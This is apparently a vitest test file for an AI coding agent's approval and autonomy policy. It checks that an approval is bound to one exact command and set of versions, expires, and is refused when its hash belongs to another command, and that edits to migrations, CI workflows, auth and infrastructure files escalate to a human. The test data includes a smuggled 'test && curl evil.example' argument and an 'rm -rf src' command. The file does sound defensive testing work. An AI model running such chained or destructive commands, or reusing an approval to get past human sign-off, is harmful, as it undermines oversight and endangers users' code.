/**
 * Identity and privilege abuse, and trust in approvals (ASI03, ASI08, ASI09):
 * an approval reused for something else, and sensitive changes slipping
 * through autonomy.
 */
import { afterEach, describe, expect, it } from "vitest";
import { approvalBindingHash, checkApprovalForExecution, type ApprovalSubject } from "@/core/trust/approval";
import { evaluateChangePolicy, type AutonomyLimits } from "@/core/trust/policy";
import { obedientModel, project, recordingRunner, run, tool, type Project } from "./support";

const SUBJECT: ApprovalSubject = {
  action: { tool: "run_command", program: "pnpm", args: ["test"], where: "sandbox" },
  contractVersion: "3",
  policyVersion: "a".repeat(64),
  resourceVersion: "run-1",
};
const NOW = new Date("2026-10-23T10:00:00Z");

let p: Project | null = null;
afterEach(async () => {
  await p?.cleanup();
  p = null;
});

describe("SE-008 An approval reused for something else", () => {
  it("covers one exact payload and set of versions, and expires", async () => {
    const record = { id: "a1", state: "approved" as const, bindingHash: await approvalBindingHash(SUBJECT), expiresAt: new Date(NOW.getTime() + 60_000) };
    expect(await checkApprovalForExecution(record, SUBJECT, NOW)).toEqual({ valid: true });
    const swapped: ApprovalSubject[] = [
      { ...SUBJECT, action: { ...(SUBJECT.action as object), args: ["test", "&&", "curl", "evil.example"] } },
      { ...SUBJECT, action: { ...(SUBJECT.action as object), where: "local" } },
      { ...SUBJECT, contractVersion: "4" },
      { ...SUBJECT, policyVersion: "b".repeat(64) },
      { ...SUBJECT, resourceVersion: "run-2" },
    ];
    for (const s of swapped) expect(await checkApprovalForExecution(record, s, NOW)).toMatchObject({ valid: false, reason: "BINDING_MISMATCH" });
    expect(await checkApprovalForExecution(record, SUBJECT, new Date(NOW.getTime() + 60_000))).toMatchObject({ valid: false, reason: "EXPIRED" });
    expect(await checkApprovalForExecution({ ...record, state: "pending" }, SUBJECT, NOW)).toMatchObject({ valid: false, reason: "NOT_APPROVED" });
  });

  it("doesn't run a command when the approval it gets back is for a different one", async () => {
    p = await project({ "README.md": "# Demo\n" });
    const runner = recordingRunner("local");
    const obey = obedientModel([() => [tool("c", "run_command", { program: "pnpm", args: ["test"], reason: "Check it." })]]);
    // Someone answers with a binding hash for another command: the loop refuses it.
    const other = await approvalBindingHash({ ...SUBJECT, action: { tool: "run_command", program: "rm", args: ["-rf", "src"], where: "local" } });
    const { approvals } = await run({ model: obey.model, workspace: await p.workspace("disk"), mode: "controlled", commands: runner }, () => ({ approved: true, bindingHash: other }));
    expect(approvals).toHaveLength(1);
    expect(runner.ran).toEqual([]);
    expect(obey.seen[1]![0]).toMatchObject({ isError: true, content: expect.stringMatching(/didn't match this exact command/) });
  });
});

describe("SE-009 Sensitive files slipping through autonomy", () => {
  const LEVEL_2: AutonomyLimits = { level: 2, maxFiles: 5, allowCreates: true };
  const SENSITIVE = [
    "supabase/migrations/20261103_drop.sql",
    ".github/workflows/deploy.yml",
    "package.json",
    "Dockerfile",
    "src/auth/session.ts",
    "src/proxy.ts",
    "infra/main.tf",
    "next.config.ts",
  ];

  it("escalates each sensitive file to an owner or admin, even with autonomy on and checks available", async () => {
    for (const path of SENSITIVE) {
      const d = await evaluateChangePolicy({ rules: null, files: [{ path, kind: "edit" }], contractViolations: [], autonomy: LEVEL_2, verifiable: true });
      expect(d.outcome, path).toBe("ESCALATE");
    }
  });

  it("never lowers a block or an escalation, and escalates very large changes", async () => {
    const blocked = await evaluateChangePolicy({ rules: null, files: [{ path: "README.md", kind: "edit" }], contractViolations: [{ kind: "scope", detail: "outside the contract" }], autonomy: LEVEL_2, verifiable: true });
    expect(blocked.outcome).toBe("BLOCK");
    const many = Array.from({ length: 11 }, (_, i) => ({ path: `docs/page-${i}.md`, kind: "edit" as const }));
    expect((await evaluateChangePolicy({ rules: null, files: many, contractViolations: [], autonomy: { ...LEVEL_2, maxFiles: 5 }, verifiable: true })).outcome).toBe("ESCALATE");
    // The control: an ordinary small change does apply on its own, so the refusals above come from the risk.
    expect((await evaluateChangePolicy({ rules: null, files: [{ path: "docs/intro.md", kind: "edit" }], contractViolations: [], autonomy: LEVEL_2, verifiable: true })).outcome).toBe("ALLOW_WITHIN_LIMITS");
  });
});
